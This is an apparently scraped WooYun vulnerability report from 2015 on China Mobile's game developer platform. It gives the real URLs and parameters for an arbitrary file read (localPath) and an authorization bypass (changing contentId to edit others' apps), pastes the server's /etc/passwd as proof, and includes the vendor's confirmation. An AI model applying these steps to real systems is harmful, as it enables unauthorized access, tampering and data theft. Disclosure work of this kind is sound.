{"id": 20178, "wybug_id": "wooyun-2015-0115003", "wybug_title": "中国移动和游戏接入平台越权查看/修改他人应用+任意文件读取", "wybug_corp": "中国移动", "wybug_author": "超威蓝猫", "wybug_date": "2015-05-19 22:56", "wybug_open_date": "2015-07-07 16:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-07：\t细节向公众公开  简要描述： 中国移动和游戏接入平台越权查看/修改他人应用+任意文件读取  详细说明：  平台地址：https://igop.cmgame.com:7443/cas/login[任意文件读取]：登录后点击“游戏管理”-“游戏信息”，\n\n上传图片后可以获得该链接：\nhttp://igop.cmgame.com:38086/pop/content/createImage2page.action?localPath=/upload/20150515/131558/40947/icon/1431666936394.jpg\n\n\n修改其中的文件地址，可读取任意文件。\n\n\n\n[越权查看/修改他人应用]：我们先确认下当前帐号只有一个游戏：\n\n登录后点击“我的待办”，点击“处理”按钮，得到如下链接：\nhttp://igop.cmgame.com:38086/pop/content/modifyGameMyWork.action?contentInfo.contentId=40947&contentInfo.gameType=1\n\n\n修改 contentInfo.contentId 即可查看/编辑他人应用。可替换apk文件、图标、截图、描述等内容。\n\n由于js原因，在新标签页打开修改过的链接并不能进行上传apk或图片等操作，所以这里使用burp抓包修改id。\n\n这里虽然还是显示当前帐号“上海纵游”，但下面的内容是属于修改过的ID的。\n\n再随便查看几个\n\n\n\n   漏洞证明：  passwd: \nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/falsedaemon:x:2:2:Daemon:/sbin:/bin/falselp:x:4:7:Printing daemon:/var/spool/lpd:/bin/falsemail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/falsewwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/falseftp:x:40:49:FTP account:/srv/ftp:/bin/falsenobody:x:65534:65533:nobody:/var/lib/nobody:/bin/falsemessagebus:x:100:101:User for D-BUS:/var/run/dbus:/bin/falsehaldaemon:x:101:102:User for haldaemon:/var/run/hal:/bin/falseman:x:13:62:Manual pages viewer:/var/cache/man:/bin/falsenews:x:9:13:News system:/etc/news:/bin/falseat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/falsesshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/falsepostfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/falsentp:x:74:105:NTP daemon:/var/lib/ntp:/bin/falsehacluster:x:90:90:heartbeat processes:/var/lib/heartbeat/cores/hacluster:/bin/falsegdm:x:50:106:Gnome Display Manager daemon:/var/lib/gdm:/bin/falsesuse-ncc:x:103:107:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/falseoracle:x:108:103::/opt/oracle:/bin/bashpatrol:x:891:890::/opt/bmc/:/bin/shsctmp:x:1002:100::/home/sctmp:/bin/bashinspur:x:1006:100::/home/inspur:/usr/bin/cshigop:x:1007:100::/home/igop:/bin/bashigoptmp:x:1008:100::/home/igoptmp:/bin/bashpop:x:1009:100::/home/mdsp/pop:/bin/bashtoptea:x:1010:2002::/home/toptea:/bin/cshetlftp:x:1011:100::/home/etlftp:/bin/csh\n   修复方案：  :)   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-05-23 16:01 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国移动集团公司通报，由其后续协调网站管理单位处置。按多个风险点评分，rank 16 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-19 23:47 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  叼叼    \n     2015-05-20 00:48 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  叼叼叼    \n     2015-05-20 13:21 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  叼叼叼叼    \n     2015-05-20 14:10 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @金枪银矛小霸王 你的牌打的也太好了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}